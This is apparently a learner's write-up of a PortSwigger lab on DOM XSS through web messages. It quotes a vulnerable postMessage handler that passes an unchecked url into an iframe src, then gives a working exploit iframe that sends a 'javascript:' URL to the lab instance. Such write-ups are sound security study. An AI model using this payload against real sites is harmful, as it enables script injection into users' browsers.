# [DOM XSS using web messages and JSON.parse] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-28
 
---
 
## Vulnerability / core concept
DOM XSS via Web Messages

---


## Payload / key command
This application uses the following script in its body:
```html
<script>
    window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
</script>
```
As we can see this web application does not check the domain that send the message. Furthermore, it does not properly validate the `d.url`. Chaining these two security gaps we can exploit this web application by using the following `iframe`:
```html
<iframe src="https://0a23005c04655474803f943500ef0085.web-security-academy.net/" onload="this.contentWindow.postMessage(JSON.stringify({type:'load-channel',url:'javascript:print()'}),'*')"></iframe>
```

